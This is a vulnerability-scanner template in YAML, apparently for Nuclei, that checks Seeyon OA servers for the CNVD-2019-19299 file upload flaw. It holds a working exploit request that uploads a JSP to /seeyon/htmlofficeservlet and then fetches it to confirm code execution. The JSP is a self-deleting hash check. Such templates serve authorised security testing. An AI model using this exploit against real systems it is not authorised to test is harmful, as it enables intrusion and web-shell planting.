id: yaml-poc-seeyon-seeyon_oa-file_upload-CNVD-2019-19299
info:
  name: Yaml Poc Seeyon Seeyon_Oa File_Upload Cnvd 2019 19299
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-file_upload-CNVD-2019-19299'
  tags: fileupload
  reference:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2019-19299
  - https://www.cnvd.org.cn/patchInfo/show/166115
http:
- method: GET
  path:
  - /seeyon/htmlofficeservlet
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - DBSTEP.*?operate err
- method: POST
  path:
  - /seeyon/htmlofficeservlet
  body: "DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\
    \nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\
    \nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\
    \nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdwLoGzYOfyUCAwUNCwYMCyUoEwighP4oXy4OJwLQCzAw5nHzs\r\
    \nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<%@ page\
    \ contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\r\n<%@ page import=\"\
    java.security.MessageDigest\" %>\r\n<%@ page import=\"com.sun.org.apache.xerces.internal.impl.dv.util.HexBin\"\
    \ %>\r\n<%\r\n    MessageDigest mdAlgorithm = MessageDigest.getInstance(\"md5\"\
    );\r\n    mdAlgorithm.reset();\r\n    mdAlgorithm.update(\"just_a_test\".getBytes());\r\
    \n    byte[] digest = mdAlgorithm.digest();\r\n    out.println(HexBin.encode(digest).toLowerCase());\r\
    \n    new java.io.File(application.getRealPath(request.getServletPath())).delete();\r\
    \n%>%"
  headers:
    Content-Type: text/html
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - DBSTEP
    - just_a_test
- method: GET
  path:
  - /seeyon/1255dbf9627d1bdf27301822d4a19d7c.jsp
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - c6db3524fe71d6c576098805a07e79e4
